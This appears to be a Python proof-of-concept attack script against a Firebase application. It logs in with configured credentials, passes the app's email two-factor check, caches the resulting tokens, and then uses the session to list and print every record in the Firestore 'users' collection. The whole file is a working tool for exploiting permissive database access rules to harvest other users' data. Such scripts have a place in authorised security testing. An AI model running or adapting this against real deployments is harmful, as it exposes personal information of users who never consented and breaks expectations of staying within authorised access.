from datetime import datetime, timedelta
from empyrebase import initialize_app
from empyrebase.empyrebase import Auth, Firebase, Firestore
import hashlib
import json
from pathlib import Path
from pprint import pprint
from pydantic import EmailStr, RootModel
from pydantic.dataclasses import dataclass
import requests
import sys
from typing import Any, Dict, Optional


@dataclass(frozen=True)
class LoginUser:
    email: str
    password: str


@dataclass(frozen=True)
class AttackConfig:
    firebase_config: Dict[str, Optional[str]]
    api_server: str
    login_user: LoginUser


@dataclass(frozen=True)
class UserToken:
    id_token: str
    refresh_token: str
    expires_at: datetime

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "UserToken":
        return cls(
            id_token=d["idToken"],
            refresh_token=d["refreshToken"],
            expires_at=datetime.now() + timedelta(seconds=int(d["expiresIn"])),
        )


@dataclass(frozen=True)
class UserCredential:
    local_id: str
    email: EmailStr
    registered: bool
    user_token: UserToken
    custom_token: Optional[str] = None

    @classmethod
    def from_dict(
        cls,
        d: Dict[str, Any],
    ) -> "UserCredential":
        return cls(
            local_id=d["localId"],
            email=d["email"],
            registered=d["registered"],
            user_token=UserToken.from_dict(d),
            custom_token=d.get("custom_token", None),
        )


class CachedUserCredential:
    _user_credential: UserCredential
    _cache_path: Path

    def __init__(
        self,
        user_credential: UserCredential,
        path: Path,
    ) -> None:
        self._user_credential = user_credential
        self._cache_path = path

    @property
    def user_credential(self) -> UserCredential:
        return self._user_credential

    @user_credential.setter
    def user_credential(
        self,
        new_user_credential: UserCredential,
    ) -> None:
        self._user_credential = new_user_credential

    def save(self) -> None:
        save_user_credential_to_cache(self._user_credential, self._cache_path)

    @classmethod
    def load(cls, cache_path) -> "CachedUserCredential":
        user_credential = get_user_credential_from_cache(cache_path)
        return cls(user_credential, cache_path)


def create_firebase_app(config: AttackConfig) -> Firebase:
    return initialize_app(config.firebase_config)


def user_credential_need_refresh(user: UserCredential, seconds=500) -> bool:
    if user.user_token is None or user.custom_token is None:
        return True

    remaining_time = user.user_token.expires_at - datetime.now()
    threshold = timedelta(seconds=seconds)
    return remaining_time < threshold


def refresh_user_credential(
    auth: Auth,
    user_credential: UserCredential,
) -> UserCredential:
    new_token_data = auth.refresh(user_credential.user_token.refresh_token)
    new_user_token = UserToken.from_dict(new_token_data)
    return UserCredential(
        local_id=user_credential.local_id,
        email=user_credential.email,
        registered=user_credential.registered,
        user_token=new_user_token,
        custom_token=user_credential.custom_token,
    )


def save_user_credential_to_cache(
    user_credential: UserCredential,
    user_file: Path,
) -> None:
    data = RootModel[UserCredential](user_credential).model_dump_json(indent=2)
    with user_file.open(mode="w") as f:
        f.write(data)


def get_user_credential_from_cache(
    user_file: Path,
) -> UserCredential:
    with user_file.open(mode="r") as f:
        return UserCredential(**json.load(f))


def get_or_create_user_credential(
    app: Firebase,
    auth: Auth,
    email: str,
    password: str,
    api_server: str,
) -> CachedUserCredential:
    auth_domain: str = app.auth_domain
    current_dir = Path(__file__).parent.resolve()
    token_dir = current_dir / ".token" / auth_domain
    token_dir.mkdir(parents=True, exist_ok=True)
    email_hash = hashlib.sha256(email.encode(encoding="utf-8"))
    token_file = token_dir / email_hash.hexdigest()

    if token_file.exists():
        return CachedUserCredential.load(token_file)

    user_data = auth.sign_in_with_email_and_password(email, password)
    user = UserCredential.from_dict(user_data)
    send_endpoint = api_server + "/api/2fa/send-code"
    send_payload = dict(userId=user.local_id, email=user.email)
    resp = requests.post(send_endpoint, json=send_payload)
    resp.raise_for_status()

    print(f"A verification code is sent to ${user.email}.")
    code = input("Please check and type in the verification code: ")
    verify_endpoint = api_server + "/api/2fa/verify-code"
    verify_payload = dict(userId=user.local_id, code=code)
    resp = requests.post(verify_endpoint, json=verify_payload)
    resp.raise_for_status()
    verify_resp_data = resp.json()
    assert verify_resp_data["valid"]
    custom_token = verify_resp_data["customToken"]
    token_data = auth.sign_in_with_custom_token(custom_token)
    new_user_token = UserToken.from_dict(token_data)
    new_user_credential = UserCredential(
        local_id=user.local_id,
        email=user.email,
        registered=user.registered,
        user_token=new_user_token,
        custom_token=custom_token,
    )
    return CachedUserCredential(new_user_credential, token_file)


def get_all_users(store: Firestore):
    users = store.list_documents("users")
    return users


def read_attack_config(config_file: Path) -> AttackConfig:
    with config_file.open(mode="r") as f:
        data = json.load(f)
        return AttackConfig(**data)


def try_attack(app: Firebase, attack_config: AttackConfig) -> None:
    auth = app.auth()
    cached_credential = get_or_create_user_credential(
        app, auth,
        attack_config.login_user.email,
        attack_config.login_user.password,
        attack_config.api_server,
    )

    if user_credential_need_refresh(cached_credential.user_credential):
        cached_credential.user_credential = refresh_user_credential(
            auth, cached_credential.user_credential,
        )

    store = app.firestore(
        auth_id=cached_credential.user_credential.user_token.id_token,
    )
    pprint(get_all_users(store))
    cached_credential.save()


if __name__ == "__main__":
    attack_config = read_attack_config(Path(sys.argv[1]))
    app = create_firebase_app(attack_config)
    try_attack(app, attack_config)
